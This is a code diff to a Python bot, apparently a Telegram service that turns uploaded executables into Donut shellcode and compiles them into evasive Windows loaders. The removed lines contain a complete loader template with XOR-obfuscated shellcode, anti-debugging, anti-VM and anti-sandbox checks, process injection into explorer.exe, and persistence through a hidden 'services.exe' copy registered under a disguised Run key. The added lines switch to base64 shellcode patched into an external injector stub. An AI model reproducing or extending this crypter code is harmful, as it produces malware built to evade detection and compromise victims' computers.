@@ -1,6 +1,7 @@
 # bot.py (Updated with Donut shellcode)
 import json
 import os
+import base64
 from datetime import datetime, timedelta, time
 from typing import Dict, Any, Optional
 import subprocess
@@ -413,201 +414,24 @@ async def get_startup_choice(update: Update, context: ContextTypes.DEFAULT_TYPE)
         await edit_message(query, "Processing your file... This may take a moment.", None)
 
         shellcode_bytes = donut.create(file=input_path)
+        encoded_shellcode = base64.b64encode(shellcode_bytes).decode('utf-8')
 
-        # --- Obfuscation & Splitting ---
-        xor_key = random.randint(1, 255)
-        chunk_size = 200  # Number of bytes per chunk
+        # Read the new C++ stub
+        with open("new_Stub/injector.cpp", "r", encoding="utf-8") as f:
+            cpp_code = f.read()
 
-        chunks = [shellcode_bytes[i:i + chunk_size] for i in range(0, len(shellcode_bytes), chunk_size)]
+        # Add startup definition if requested
+        if startup:
+            cpp_code = '#define StartUP true\n' + cpp_code
 
-        obfuscated_chunks = []
-        for chunk in chunks:
-            obfuscated_chunks.append(bytes([b ^ xor_key for b in chunk]))
+        # Inject the shellcode
+        cpp_code = cpp_code.replace(
+            'std::string en_sh = "";',
+            f'std::string en_sh = "{encoded_shellcode}";'
+        )
 
-        # --- C++ Code Generation ---
-        cpp_shellcode_definitions = ""
-        for i, chunk in enumerate(obfuscated_chunks):
-            hex_str = ", ".join([f"(char)0x{b:02x}" for b in chunk])
-            cpp_shellcode_definitions += f"char chunk_{i}[] = {{ {hex_str} }};\n"
-
-        cpp_chunk_pointers = ", ".join([f"(unsigned char*)chunk_{i}" for i in range(len(chunks))])
-        cpp_chunk_sizes = ", ".join([str(len(chunk)) for chunk in chunks])
-
-        startup_macro = "#define StartUP true" if startup else "#define StartUP false"
-
-        cpp_template = f'''
-// Anti-forensics headers. anti_vm.h must be first to ensure winsock2.h is included before windows.h
-#include "anti_vm.h"
-
-// Undefine __cpuid to prevent conflict between <cpuid.h> (from anti_vm) and <intrin.h> (from anti_debug)
-#if defined(__GNUC__) && defined(__cpuid)
-#undef __cpuid
-#endif
-
-#include "anti_debug.h"
-#include "anti_sandbox.h"
-
-#include <windows.h>
-#include <iostream>
-#include <vector>
-#include <string>
-#include <tlhelp32.h>
-#include <stdlib.h>
-
-{startup_macro}
-
-// --- Shellcode Data ---
-{cpp_shellcode_definitions}
-
-unsigned char* shellcode_chunks[] = {{ {cpp_chunk_pointers} }};
-size_t chunk_sizes[] = {{ {cpp_chunk_sizes} }};
-const int num_chunks = {len(chunks)};
-const unsigned char xor_key = {xor_key};
-// --- End Shellcode Data ---
-
-
-bool RegisterSystemTask(const std::string& executablePath) {{
-    HKEY hKey;
-    const char* runKey = "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run";
-    const char* valueName = "SystemCoreService";
-
-    LONG openRes = RegOpenKeyExA(HKEY_CURRENT_USER, runKey, 0, KEY_WRITE, &hKey);
-    if (openRes != ERROR_SUCCESS) {{
-        return false;
-    }}
-
-    LONG setRes = RegSetValueExA(hKey, valueName, 0, REG_SZ, (const BYTE*)executablePath.c_str(), executablePath.length() + 1);
-    if (setRes != ERROR_SUCCESS) {{
-        RegCloseKey(hKey);
-        return false;
-    }}
-
-    RegCloseKey(hKey);
-    return true;
-}}
-
-enum RelocateResult {{
-    RELOCATE_SUCCESS,
-    RELOCATE_ALREADY_EXISTS,
-    RELOCATE_FAILED
-}};
-
-RelocateResult RelocateModule(std::string& newPath) {{
-    char currentPath[MAX_PATH];
-    GetModuleFileNameA(NULL, currentPath, MAX_PATH);
-
-    const char* appDataPath = getenv("APPDATA");
-    if (appDataPath == NULL) {{
-        return RELOCATE_FAILED;
-    }}
-
-    newPath = std::string(appDataPath) + "\\\\services.exe";
-
-    if (!CopyFileA(currentPath, newPath.c_str(), TRUE)) {{ // TRUE = bFailIfExists
-        DWORD error = GetLastError();
-        if (error == ERROR_FILE_EXISTS) {{
-            return RELOCATE_ALREADY_EXISTS;
-        }} else {{
-            return RELOCATE_FAILED;
-        }}
-    }}
-
-    SetFileAttributesA(newPath.c_str(), FILE_ATTRIBUTE_HIDDEN);
-    return RELOCATE_SUCCESS;
-}}
-
-DWORD FindTargetProcess(const std::string& processName) {{
-    PROCESSENTRY32 entry;
-    entry.dwSize = sizeof(PROCESSENTRY32);
-
-    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (snapshot == INVALID_HANDLE_VALUE) {{
-        return 0;
-    }}
-
-    if (Process32First(snapshot, &entry) == TRUE) {{
-        while (Process32Next(snapshot, &entry) == TRUE) {{
-            if (_stricmp(entry.szExeFile, processName.c_str()) == 0) {{
-                CloseHandle(snapshot);
-                return entry.th32ProcessID;
-            }}
-        }}
-    }}
-
-    CloseHandle(snapshot);
-    return 0;
-}}
-
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {{
-    if (CheckForDebugger() || AntiVM::isVM() || AntiSandbox::check_cpuid() || AntiSandbox::check_timing() || AntiSandbox::check_ram() || AntiSandbox::check_mac_address() || AntiSandbox::check_hardware_names() || AntiSandbox::check_linux_artifacts() || AntiSandbox::check_registry_keys() || AntiSandbox::check_vm_files() || AntiSandbox::check_running_processes()) {{
-        return 1;
-    }}
-
-    // --- De-obfuscate and Reassemble Shellcode ---
-    size_t total_size = 0;
-    for (int i = 0; i < num_chunks; ++i) {{
-        total_size += chunk_sizes[i];
-    }}
-
-    std::vector<unsigned char> shellcode_buffer;
-    shellcode_buffer.reserve(total_size);
-
-    for (int i = 0; i < num_chunks; ++i) {{
-        for (size_t j = 0; j < chunk_sizes[i]; ++j) {{
-            shellcode_buffer.push_back(shellcode_chunks[i][j] ^ xor_key);
-        }}
-    }}
-    // --- End De-obfuscation ---
-
-    DWORD pid = FindTargetProcess("explorer.exe");
-    if (pid == 0) {{
-        return 1;
-    }}
-
-    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid);
-    if (hProcess == NULL) {{
-        return 1;
-    }}
-
-    PVOID pRemoteAddress = VirtualAllocEx(hProcess, NULL, shellcode_buffer.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    if (pRemoteAddress == NULL) {{
-        CloseHandle(hProcess);
-        return 1;
-    }}
-
-    if (!WriteProcessMemory(hProcess, pRemoteAddress, shellcode_buffer.data(), shellcode_buffer.size(), NULL)) {{
-        VirtualFreeEx(hProcess, pRemoteAddress, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
-        return 1;
-    }}
-
-    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteAddress, NULL, 0, NULL);
-    if (hThread == NULL) {{
-        VirtualFreeEx(hProcess, pRemoteAddress, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
-        return 1;
-    }}
-
-    CloseHandle(hThread);
-    CloseHandle(hProcess);
-
-#if StartUP
-    // --- Persistence Logic ---
-    std::string newPath;
-    RelocateResult relocateResult = RelocateModule(newPath);
-
-    if (relocateResult == RELOCATE_SUCCESS) {{
-        if (!RegisterSystemTask(newPath)) {{
-            // Persistence failed, but payload delivered.
-        }}
-    }}
-#endif
-
-    return 0;
-}}
-'''
         with open(cpp_file_path, "w", encoding="utf-8") as f:
-            f.write(cpp_template)
+            f.write(cpp_code)
 
         # Obfuscate the C++ file
         try:
